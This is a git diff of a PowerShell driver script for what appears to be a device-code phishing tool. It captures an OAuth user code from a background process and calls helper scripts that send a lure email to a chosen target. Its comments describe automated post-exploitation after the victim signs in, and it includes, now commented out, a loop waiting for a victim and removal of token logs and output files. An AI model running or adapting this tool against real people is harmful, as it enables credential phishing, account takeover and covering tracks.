@@ -11,7 +11,9 @@ param (
     [Parameter(ValueFromPipelineByPropertyName=$true)]
     [string]$Token,
     [Parameter(ValueFromPipelineByPropertyName=$true)]
-    [string]$template
+    [string]$template,
+    [Parameter(ValueFromPipelineByPropertyName=$true)]
+    [switch]$install = $false    
 )
 
 $banner = @"
@@ -91,21 +93,21 @@ $banner = @"
 "@
 Write-Host $banner
 
-# Define the script and its parameters
-$scriptPath = ".\PhirstPhish.ps1"
-if($template){ $scriptParams = "-targetUser $targetUser -messageContent $messageContent -subject $subject -template $template" }
-else{$scriptParams = "-targetUser $targetUser -messageContent $messageContent -subject $subject"}
+# Install and Import
+# if($install = $true){
+#     Write-Output "Installing modules"
+#     .\Scripts\Install.ps1
+# }
+Write-Output "Importing modules"
+.\Scripts\Import.ps1
 
-Write-Output "Starting PhirstPhish.ps1 in a separate process. Required modules all dependencies will be installed and capture the code generated for the template."
-Write-Output "Be patient! Output will resume here when the code is generated. You will prompted to sign in with your sender's account to send the first round."
-
-# Start the script in a new process, so we can poll the oauth endpoint in the background.
-$process = Start-Process powershell -ArgumentList "$scriptPath $scriptParams" -PassThru -RedirectStandardOutput "output.txt" # -WindowStyle minimized
+# Start the separate script as a new process and redirect output to a file
+Start-Process -FilePath "powershell.exe" -ArgumentList "-File .\Phirst.ps1" -RedirectStandardOutput "output.txt" # -NoNewWindow
 
 # Wait for the file to have content 
 Start-Sleep -Seconds 1
 
-# Continuously check the output file from the background process for the user code 
+# Continuously check the output file for the user code
 $userCode = $null
 while ($null -eq $userCode -and -not $process.HasExited) {
     $output = Get-Content "output.txt" -Tail 10 # Read the last 10 lines of the output
@@ -122,39 +124,54 @@ Write-Output "$userCode" | Out-File .\user_code.txt
 # Output the user code
 Write-Host "User Code: $userCode"
 
-Write-Output "Sign in with your sender's account here. Template will be sent from this mailbox."
-.\Next.ps1 -firstUser $firstUser -code $userCode -template $template
+# Replace Values in Template
 
-Write-Output "Background process is polling endpoint for the authentication. If the user authenticates, automated post-exploitation will be performed inside that process."
-# Write-Output "Script will continue when process exits."
+# Write-Output "Sign in with your sender's account here. Template will be sent from this mailbox."
+.\Next.ps1 -firstUser $firstUser -userCode $userCode -template $template
 
-$filePath = '.\switch.txt'
-# Poll for the existence of the file
-while (-not (Test-Path -Path $filePath)) {
-    Write-Output "Checking for switch.txt.."
-    Start-Sleep -Seconds 5 # Wait for 5 seconds before checking again
-}
+# Send email to initial target
+if(!($subject)){ $subject = Get-Random -InputObject $subjects} 
+.\Final.ps1 -targetUser $firstUser -messageContent $messageContent2 -subject $subject
 
-# Once the file exists, read its contents
-Write-Output "File exists!"
-$contents = Get-Content -Path $filePath
 
-# Display the contents
-Write-Output "$contents took the bait."
 
-$process.WaitForExit()
-$process | Stop-Process -Force -Confirm
-# Remove our switch file
-if(test-path .\switch.txt){ Remove-Item -force .\switch.txt } 
 
-# $process.Kill()
 
-Read-Host "Clean up and clear output?"
-# $processes = Get-Process powershell | Sort-Object StartTime -Descending | Select-Object -First 1 | ForEach-Object { $_.Kill() }
-if(test-path .\output.txt) { Remove-Item -force .\output.txt }
-if(test-path .\user_code.txt) { Remove-Item -force .\user_code.txt }
-if(test-path .\TokenLog.log) { Remove-Item -force .\TokenLog.log }
-if(test-path *.json) { Remove-Item -force *.json }
+
+
+
+
+
+# Write-Output "Background process is polling endpoint for the authentication. If the user authenticates, automated post-exploitation will be performed inside that process."
+# # Write-Output "Script will continue when process exits."
+
+# $filePath = '.\switch.txt'
+# # Poll for the existence of the file
+# while (-not (Test-Path -Path $filePath)) {
+#     Write-Output "Checking for switch.txt.."
+#     Start-Sleep -Seconds 5 # Wait for 5 seconds before checking again
+# }
+
+# # Once the file exists, read its contents
+# Write-Output "File exists!"
+# $contents = Get-Content -Path $filePath
+
+# # Display the contents
+# Write-Output "$contents took the bait."
+
+# $process.WaitForExit()
+# $process | Stop-Process -Force -Confirm
+# # Remove our switch file
+# if(test-path .\switch.txt){ Remove-Item -force .\switch.txt } 
+
+# # $process.Kill()
+
+# Read-Host "Clean up and clear output?"
+# # $processes = Get-Process powershell | Sort-Object StartTime -Descending | Select-Object -First 1 | ForEach-Object { $_.Kill() }
+# if(test-path .\output.txt) { Remove-Item -force .\output.txt }
+# if(test-path .\user_code.txt) { Remove-Item -force .\user_code.txt }
+# if(test-path .\TokenLog.log) { Remove-Item -force .\TokenLog.log }
+# if(test-path *.json) { Remove-Item -force *.json }
 
 # $targetUser = ""
 # $firstUser = ""
